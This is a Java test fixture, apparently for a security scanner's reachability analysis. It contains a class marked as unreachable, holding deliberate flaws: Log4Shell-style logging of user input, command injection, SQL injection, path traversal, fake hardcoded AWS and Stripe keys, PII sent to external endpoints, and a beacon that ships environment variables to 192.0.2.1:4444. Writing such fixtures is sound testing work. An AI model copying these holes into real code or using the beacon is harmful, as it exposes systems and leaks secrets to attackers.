package com.example;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * NOT_REACHABLE signals — this class has NO @Component, @Service, or @RestController.
 * Spring never instantiates it. No other class references it.
 * Everything here is dead code.
 *
 * CVE-2021-44228 (Log4Shell): logger.info(userInput) — NOT_REACHABLE.
 * CWE-78, CWE-89, CWE-22: all in dead methods — NOT_REACHABLE.
 * SECRET: hardcoded credentials — NOT_REACHABLE.
 * DLP: PII taint flows — NOT_REACHABLE.
 * AI: LLM calls — NOT_REACHABLE.
 * MALWARE: C2 beacon pattern — NOT_REACHABLE.
 */
public class DeadCodeService {

    private static final Logger logger = LogManager.getLogger(DeadCodeService.class);

    // SECRET NOT_REACHABLE: class never instantiated
    private static final String AWS_KEY_ID  = "AKIAJADEAD0000EXAMPLE";
    private static final String AWS_SECRET  = "javaDEAD/K7MDENGbPxRfiCYEXAMPLEKEY";
    private static final String STRIPE_KEY  = "sk_live_javaNR_xxxxxxxxxxxxxxxxxxx";

    /** CVE-2021-44228 NOT_REACHABLE: Log4Shell via logger.info(userInput). */
    public void logUserInputDead(String userInput) {
        logger.info("Input: {}", userInput); // Log4Shell trigger — NOT_REACHABLE
    }

    /** CWE-78 NOT_REACHABLE: OS command injection. */
    public String runCommandDead(String cmd) throws Exception {
        return new String(Runtime.getRuntime().exec(cmd).getInputStream().readAllBytes());
    }

    /** CWE-89 NOT_REACHABLE: SQL injection. */
    public void queryDead(java.sql.Connection conn, String input) throws Exception {
        conn.createStatement().executeQuery("SELECT * FROM t WHERE x='" + input + "'");
    }

    /** CWE-22 NOT_REACHABLE: path traversal. */
    public String readFileDead(String name) throws Exception {
        return java.nio.file.Files.readString(java.nio.file.Paths.get("/etc", name));
    }

    /** DLP NOT_REACHABLE: SSN + card to external HTTP. */
    public void exportPiiDead(String ssn, String card) throws Exception {
        var url = new java.net.URL("https://crm.example.com/sync");
        var conn = (java.net.HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        conn.getOutputStream().write(("ssn=" + ssn + "&card=" + card).getBytes());
    }

    /** AI NOT_REACHABLE: PII sent to LLM. */
    public void piiToLlmDead(String ssn, String diagnosis) throws Exception {
        var url = new java.net.URL("https://api.openai.com/v1/chat/completions");
        var conn = (java.net.HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        String body = "{\"messages\":[{\"role\":\"user\",\"content\":\"ssn=" + ssn
                      + " diagnosis=" + diagnosis + "\"}]}";
        conn.getOutputStream().write(body.getBytes());
    }

    /** MALWARE NOT_REACHABLE: C2 beacon pattern. */
    public void beaconDead() throws Exception {
        var sock = new java.net.Socket("192.0.2.1", 4444);
        sock.getOutputStream().write(System.getenv().toString().getBytes());
        sock.close();
    }

    /** SECRET NOT_REACHABLE: returns AWS credentials. */
    public String[] getAwsCredsDead() { return new String[]{AWS_KEY_ID, AWS_SECRET}; }
}
